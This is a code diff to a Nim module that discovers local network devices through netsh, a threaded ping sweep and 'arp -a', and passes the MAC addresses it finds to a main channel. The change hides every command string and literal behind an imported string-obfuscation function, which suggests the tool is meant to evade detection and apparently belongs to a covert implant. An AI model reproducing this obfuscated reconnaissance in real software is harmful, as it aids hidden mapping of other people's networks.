@@ -13,12 +13,14 @@ var connectedDevicesThreadChannel: Channel[string]
 from ../flags import CONNECTED_DEVICES_THREAD_NO_OF_THREADS
 from ../channels import mainChannel
 
-proc getIPAndSubnetMask(): tuple[ip: string, subnetMask: string] =
-  let netsh: string = execProcess "netsh interface ip show addresses \"Wi-Fi\""
+import ../functions/hideString
 
-  for line in netsh.split("\n"):
-    if line.contains("Subnet Prefix"):
-      let split = line.split(":")[1].unIndent().split(" ")[0].split("/")
+proc getIPAndSubnetMask(): tuple[ip: string, subnetMask: string] =
+  let netsh: string = execProcess d e "netsh interface ip show addresses \"Wi-Fi\""
+
+  for line in netsh.split d e "\n":
+    if line.contains d e"Subnet Prefix":
+      let split = line.split(d e":")[1].unIndent().split(d e" ")[0].split(d e"/")
 
       result.ip = split[0]
       result.subnetMask = split[1]
@@ -28,13 +30,13 @@ proc generateIPsForPing(start1, stop1, start2, stop2: uint8): seq[string] =
   ## 100.100.100.100
   for c in start1..stop1:
     for d in start2..stop2:
-      result.add "192.168." & $c & "." & $d
+      result.add d(e("192.168.")) & $c & d(e(".")) & $d
 
 proc pingIPs(ips: seq[string]): void {.thread.} =
   for ip in ips:
-    let ping: string = execProcess "ping -n 1 " & ip
+    let ping: string = execProcess d(e("ping -n 1 ")) & ip
 
-    if ping.contains("Approximate round"):
+    if ping.contains d e"Approximate round":
       connectedDevicesThreadChannel.send ip
 
 proc assignIPSToThread(ips: seq[string]): seq[seq[string]] =
@@ -57,13 +59,13 @@ proc assignIPSToThread(ips: seq[string]): seq[seq[string]] =
 
 
 proc getMACSFromIPS(ips: seq[string]): void =
-  let arp: string = execProcess "arp -a"
+  let arp: string = execProcess d e"arp -a"
 
-  for line in arp.split "\n":
-    if line.contains("dynamic"):
+  for line in arp.split d e "\n":
+    if line.contains d e"dynamic":
       for ip in ips:
         if line.contains(ip):
-          mainChannel.send "mac: " & line.splitWhitespace()[1]
+          mainChannel.send d(e("mac: ")) & line.splitWhitespace()[1]
           break
 
 proc createThreads(ips: seq[seq[string]]): void =
@@ -82,13 +84,13 @@ proc createThreads(ips: seq[seq[string]]): void =
 proc initConnectedDevicesThread*(): void {.thread.} =
   let (ip, subnetMask) = getIPAndSubnetMask()
 
-  let ipParts: seq[string] = ip.split(".")
+  let ipParts: seq[string] = ip.split d e"."
   let ipPart2: uint8 = uint8 parseUInt ipParts[2]
 
   var ips: seq[string]
 
   case subnetMask
-  of "24":
+  of d e"24":
     ips = generateIPsForPing(ipPart2, ipPart2, 0, 255)
 
   let assignedIPs: seq[seq[string]] = assignIPSToThread ips
